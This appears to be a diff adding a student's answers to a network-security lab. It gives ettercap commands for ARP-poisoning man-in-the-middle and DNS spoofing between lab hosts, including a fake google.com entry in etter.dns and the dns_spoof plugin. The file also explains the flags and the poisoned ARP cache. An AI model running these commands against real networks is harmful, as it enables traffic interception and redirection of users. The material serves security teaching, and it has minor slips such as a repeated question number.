@@ -1,0 +1,31 @@
+# Q1
+ettercap --text --iface eth0 --nosslmitm --nopromisc --only-mitm --mitm arp /10.1.2.2/// /10.1.2.3///
+
+# Q2
+-- text : text interface
+--iface: interface
+--nosslmitm: disable SSL certificates forgery. Used to intercept https traffic.
+--only-mitm: do not sniff, only perform MitM attack.
+--nopromisc: disable sniff of all traffic in iface.
+--mitm: which MitM attack to employ.
+
+# Q3
+Cache IP: 10.1.2.2
+Cache MAC: 00:04:23:ae:cc:32
+Auth server IP: 10.1.2.3
+Auth server MAC: 00:04:23:ae:cc:32
+
+# Q4
+Yes
+
+# Q4
+Differs, because the attacker is sending gratuitous arp to chace impersonating auth and to auth impersonating cache.
+
+# Q6
+# At the bottom of /etc/ettercap/etter.dns
+www.google.com A 10.1.2.4
+# On attacker machine
+ettercap --text --iface eth0 --nosslmitm --nopromisc --plugin dns_spoof --mitm arp /10.1.2.2/// /10.1.2.3///
+
+# Q7
+An attacker can redirect all the traffic from client to himself.
